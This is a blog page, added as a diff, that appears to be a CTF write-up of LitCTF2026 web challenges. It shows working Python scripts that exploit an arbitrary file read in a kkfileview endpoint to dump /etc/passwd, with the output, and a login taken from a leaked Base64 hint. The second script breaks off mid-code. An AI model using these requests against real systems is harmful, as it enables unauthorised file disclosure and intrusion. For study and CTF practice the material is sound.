@@ -1,0 +1,743 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://ether-lin.cn';window.REIMU_CONFIG.relative = '/';</script>
+  <title>
+    LitCTF2026 | 旧书页间，夹着半叶梧桐
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="华辰企业服务运营平台 没思路，就dirsearch扫了一下，  访问喽，&#x2F;actuator&#x2F;env   Northbridge Document Hub  任意文件读取  先查看源码看看有什么东西 12345678910111213141516171819202122232425262728293031323334(function () &amp;#123;  var bootstrap &#x3D; &amp;#12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF2026">
+<meta property="og:url" content="http://ether-lin.cn/2026/05/25/LitCTF2026/index.html">
+<meta property="og:site_name" content="旧书页间，夹着半叶梧桐">
+<meta property="og:description" content="华辰企业服务运营平台 没思路，就dirsearch扫了一下，  访问喽，&#x2F;actuator&#x2F;env   Northbridge Document Hub  任意文件读取  先查看源码看看有什么东西 12345678910111213141516171819202122232425262728293031323334(function () &amp;#123;  var bootstrap &#x3D; &amp;#12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/01.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/02.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/03.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/04.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/05.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/06.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/07.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/08.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/09.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/10.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/11.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/12.png">
+<meta property="og:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/13.png">
+<meta property="article:published_time" content="2026-05-25T15:35:46.000Z">
+<meta property="article:modified_time" content="2026-05-29T00:53:54.389Z">
+<meta property="article:author" content="Ether">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ether-lin.cn/2026/05/25/LitCTF2026/01.png">
+      <meta name="keywords" content="网络安全学习,成长,思考">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">焦虑是自由的眩晕...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/archives">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/about">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/friends">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/covers/07.jpg" alt="LitCTF2026">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">LitCTF2026</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%8E%E8%BE%B0%E4%BC%81%E4%B8%9A%E6%9C%8D%E5%8A%A1%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0"><span class="toc-number">1.</span> <span class="toc-text"> 华辰企业服务运营平台</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#northbridge-document-hub"><span class="toc-number">2.</span> <span class="toc-text"> Northbridge Document Hub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text"> 任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BA%BF%E7%B4%A2%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 关键线索分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lit_ezsql"><span class="toc-number">3.</span> <span class="toc-text"> lit_ezsql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gbk-%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">3.1.</span> <span class="toc-text"> GBK 宽字节绕过单引号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lit_ezssti"><span class="toc-number">4.</span> <span class="toc-text"> lit_ezssti</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mako-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text"> Mako 模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E6%A8%A1%E6%9D%BF%E6%8C%87%E7%BA%B9"><span class="toc-number">4.1.1.</span> <span class="toc-text"> 测模板指纹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-waf"><span class="toc-number">4.1.2.</span> <span class="toc-text"> 分析 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96-flag"><span class="toc-number">4.1.3.</span> <span class="toc-text"> 读取 flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lit_reverse_my_web"><span class="toc-number">5.</span> <span class="toc-text"> lit_reverse_my_web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt"><span class="toc-number">5.1.</span> <span class="toc-text"> JWT</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ether" class="lazyload">
+  <div class="sidebar-author-name">Ether</div>
+  <div class="sidebar-description">求索本身即是归路</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=2930289360@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/yourname itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/friends" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-LitCTF2026" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-25T15:35:46.000Z" itemprop="datePublished">2026-05-25</time>
+    <time style="display: none;" id="post-update-time">2026-05-29</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="华辰企业服务运营平台"><a class="markdownIt-Anchor" href="#华辰企业服务运营平台"></a> 华辰企业服务运营平台</h1>
+<p>没思路，就<code>dirsearch</code>扫了一下，</p>
+<p><img src="01.png" alt="actuator-env" /></p>
+<p>访问喽，<code>/actuator/env</code></p>
+<p><img src="02.png" alt="actuator-env" /></p>
+<h1 id="northbridge-document-hub"><a class="markdownIt-Anchor" href="#northbridge-document-hub"></a> Northbridge Document Hub</h1>
+<h2 id="任意文件读取"><a class="markdownIt-Anchor" href="#任意文件读取"></a> 任意文件读取</h2>
+<p><img src="03.png" alt="actuator-env" /></p>
+<p>先查看源码看看有什么东西</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> bootstrap = &#123;</span><br><span class="line">    <span class="attr">release</span>: <span class="string">&quot;2026.03.01-r12&quot;</span>,</span><br><span class="line">    <span class="attr">region</span>: <span class="string">&quot;cn-sh2&quot;</span>,</span><br><span class="line">    <span class="attr">auth</span>: &#123;</span><br><span class="line">      <span class="attr">mode</span>: <span class="string">&quot;legacy-fallback&quot;</span>,</span><br><span class="line">      <span class="comment">// researcher:Research#2026</span></span><br><span class="line">      <span class="attr">seed</span>: <span class="string">&quot;cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">fileGateway</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&quot;/kkfileview/getCorsFile&quot;</span>,</span><br><span class="line">      <span class="attr">queryKey</span>: <span class="string">&quot;urlPath&quot;</span>,</span><br><span class="line">      <span class="attr">node</span>: <span class="string">&quot;legacy-parse-02&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">NorthbridgePortal</span> = &#123;</span><br><span class="line">    <span class="attr">config</span>: bootstrap,</span><br><span class="line">    <span class="attr">decodeLegacyCredential</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">atob</span>(bootstrap.<span class="property">auth</span>.<span class="property">seed</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;form[data-auth=&#x27;portal&#x27;]&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (form) &#123;</span><br><span class="line">    form.<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      form.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;is-submitting&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>看到了一个注释行，一个<code>Base64</code>编码，应该是账号密码提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// researcher:Research#2026</span><br><span class="line">cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2    //解码：researcher:Research#2026</span><br></pre></td></tr></table></figure>
+<p>所以猜测：</p>
+<p><strong>账号：</strong><code>researcher</code><br />
+<strong>密码：</strong><code>Research#2026</code></p>
+<p><img src="04.png" alt="actuator-env" /><br />
+成功登陆</p>
+<p>我知道为什么我当时一直访问不成功了，是因为我登录时的账号的<code>cookies</code>是不会一直跟随我的</p>
+<p>所以以后遇到这种题目要写脚本，就差最后一步了，还是太菜了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 配置区 ==========</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://challenge.cyclens.tech:32304/kkfileview/getCorsFile&quot;</span></span><br><span class="line">FILE_PATH = <span class="string">&quot;file:///etc/passwd&quot;</span>       <span class="comment"># 要读取的文件路径</span></span><br><span class="line">COOKIES = &#123;</span><br><span class="line">    <span class="string">&quot;session&quot;</span>: <span class="string">&quot;你的cookie值&quot;</span>,          <span class="comment"># ← 替换为实际 cookie</span></span><br><span class="line">    <span class="comment"># 如有其他 cookie 字段，继续添加</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ============================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Base64 编码（UTF-8）</span></span><br><span class="line">payload = base64.b64encode(FILE_PATH.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Payload (Base64): <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 发起请求</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>?urlPath=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    resp = requests.get(url, cookies=COOKIES, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Status Code: <span class="subst">&#123;resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Response Body:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] Request failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS D:\CODE&gt; python -u &quot;d:\CODE\test\test.py&quot;</span><br><span class="line">[*] Payload (Base64): ZmlsZTovLy9ldGMvcGFzc3dk</span><br><span class="line">[*] Status Code: 200</span><br><span class="line">[*] Response Body:</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>成功回显 <code>/etc/passwd</code> 内容，说明这里存在任意文件读取。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/genhaosan_/article/details/161348476">LitCTF2026wp-CSDN博客</a></p>
+<p><strong>漏洞原理</strong></p>
+<p>后续将部署包拉下来反编译，恢复出了核心逻辑。KkPathResolver 的处理流程大致如下：</p>
+<ul>
+<li>对 urlPath 做 Base64 解码</li>
+<li>将反斜杠替换为正斜杠</li>
+<li>如果存在 <code>?</code>，截断查询字符串</li>
+<li>如果以 <code>file://</code> 开头，就去掉协议头</li>
+<li>转成 Path 并<code> normalize()</code></li>
+<li>如果路径字符串里 不包含<code> /opt/kkfileview/cache/</code>，就把它拼到缓存根 <code>/opt/kkfileview/cache/parsed</code> 下面</li>
+<li>否则直接使用该路径</li>
+</ul>
+<p><strong>问题在于：</strong></p>
+<ul>
+<li>接口允许 <code>file://</code></li>
+<li>没有真正限制读取根目录</li>
+<li>只通过字符串 <code>contains(&quot;/opt/kkfileview/cache/&quot;)</code> 来判断是否属于缓存目录</li>
+</ul>
+<p><strong>因此只要传：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base64(&quot;file:///任意本地文件&quot;)</span><br></pre></td></tr></table></figure>
+<p>就可以直接读取任意本地文件。</p>
+<p>这就是本题的核心漏洞。</p>
+<p>那就可以直接修改脚本了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 配置区 ==========</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://challenge.cyclens.tech:30243/kkfileview/getCorsFile&quot;</span>  <span class="comment"># ⚠️ 确认30243是否仍能访问</span></span><br><span class="line">FILE_PATH = <span class="string">&quot;file:///usr/local/bin/docker-entrypoint.sh&quot;</span></span><br><span class="line">COOKIES = &#123;<span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;&lt;YOUR_SESSION_ID&gt;&quot;</span>&#125;  <span class="comment"># 替换为你自己登录后的Cookie</span></span><br><span class="line"></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ============================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Base64 编码</span></span><br><span class="line">payload = base64.b64encode(FILE_PATH.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Reading: <span class="subst">&#123;FILE_PATH&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Base64 payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 发起请求</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>?urlPath=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    resp = requests.get(url, cookies=COOKIES, headers=HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Status Code: <span class="subst">&#123;resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span> <span class="keyword">and</span> resp.text.strip():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Script content:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 快速搜索关键词（flag / archive / finance / python / cat）</span></span><br><span class="line">        keywords = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;archive&quot;</span>, <span class="string">&quot;finance&quot;</span>, <span class="string">&quot;quarter&quot;</span>, <span class="string">&quot;generate&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&gt;&gt;&quot;</span>]</span><br><span class="line">        found = []</span><br><span class="line">        <span 